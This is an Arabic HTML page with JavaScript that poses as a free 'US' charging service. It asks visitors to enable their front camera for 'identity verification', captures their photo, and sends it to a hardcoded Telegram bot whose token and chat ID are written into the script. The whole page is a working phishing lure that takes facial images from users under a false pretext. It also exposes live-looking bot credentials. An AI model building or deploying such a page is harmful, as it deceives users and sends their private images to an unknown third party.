<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>شحن US مجاناً</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #333;
        }
        .container {
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 90%;
            max-width: 500px;
            text-align: center;
        }
        #cameraView {
            width: 100%;
            height: 300px;
            background-color: #eee;
            margin: 20px 0;
            border-radius: 5px;
            display: none;
        }
        #capturedImage {
            max-width: 100%;
            max-height: 300px;
            display: none;
            margin: 20px 0;
            border-radius: 5px;
        }
        button {
            background-color: #e74c3c;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px 0;
        }
        .message {
            margin-top: 20px;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        .success {
            background-color: #d4edda;
            color: #155724;
        }
        .error {
            background-color: #f8d7da;
            color: #721c24;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>خدمة شحن US مجاناً</h1>
        <p>للاستمرار، يرجى السماح بالوصول إلى الكاميرا للتحقق من الهوية</p>
        
        <button id="startCamera">تفعيل الكاميرا</button>
        <button id="captureBtn" style="display: none;">التقاط صورة</button>
        <button id="sendBtn" style="display: none;">إرسال الصورة</button>
        
        <video id="cameraView" autoplay playsinline></video>
        <canvas id="canvas" style="display: none;"></canvas>
        <img id="capturedImage" alt="الصورة الملتقطة">
        
        <div id="message" class="message"></div>
    </div>

    <script>
        // بيانات البوت
        const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
        const chatId = '6913353602';
        
        // عناصر DOM
        const startCameraBtn = document.getElementById('startCamera');
        const captureBtn = document.getElementById('captureBtn');
        const sendBtn = document.getElementById('sendBtn');
        const cameraView = document.getElementById('cameraView');
        const canvas = document.getElementById('canvas');
        const capturedImage = document.getElementById('capturedImage');
        const messageDiv = document.getElementById('message');
        
        let stream = null;
        let capturedPhoto = null;
        
        // بدء الكاميرا
        startCameraBtn.addEventListener('click', async () => {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user' }, // الكاميرا الأمامية
                    audio: false
                });
                
                cameraView.srcObject = stream;
                cameraView.style.display = 'block';
                startCameraBtn.style.display = 'none';
                captureBtn.style.display = 'inline-block';
                
                showMessage('تم تفعيل الكاميرا بنجاح', 'success');
            } catch (err) {
                showMessage('خطأ في الوصول إلى الكاميرا: ' + err.message, 'error');
                console.error('Camera error:', err);
            }
        });
        
        // التقاط صورة
        captureBtn.addEventListener('click', () => {
            if (!stream) return;
            
            canvas.width = cameraView.videoWidth;
            canvas.height = cameraView.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
            
            capturedPhoto = canvas.toDataURL('image/jpeg');
            capturedImage.src = capturedPhoto;
            capturedImage.style.display = 'block';
            captureBtn.style.display = 'none';
            sendBtn.style.display = 'inline-block';
            
            // إيقاف الكاميرا بعد التقاط الصورة
            stream.getTracks().forEach(track => track.stop());
            cameraView.style.display = 'none';
            
            showMessage('تم التقاط الصورة بنجاح', 'success');
        });
        
        // إرسال الصورة إلى التليجرام
        sendBtn.addEventListener('click', async () => {
            if (!capturedPhoto) {
                showMessage('لا توجد صورة ملتقطة', 'error');
                return;
            }
            
            try {
                // تحويل الصورة من base64 إلى blob
                const blob = await fetch(capturedPhoto).then(res => res.blob());
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'user_photo.jpg');
                formData.append('caption', 'صورة المستخدم من موقع شحن US');
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                const data = await response.json();
                
                if (data.ok) {
                    showMessage('تم إرسال الصورة بنجاح إلى المسؤول', 'success');
                    sendBtn.style.display = 'none';
                } else {
                    showMessage('فشل في إرسال الصورة', 'error');
                }
            } catch (err) {
                showMessage('حدث خطأ أثناء الإرسال: ' + err.message, 'error');
                console.error('Send error:', err);
            }
        });
        
        function showMessage(message, type) {
            messageDiv.textContent = message;
            messageDiv.className = 'message ' + type;
            messageDiv.style.display = 'block';
            
            setTimeout(() => {
                messageDiv.style.display = 'none';
            }, 5000);
        }
    </script>
</body>
</html>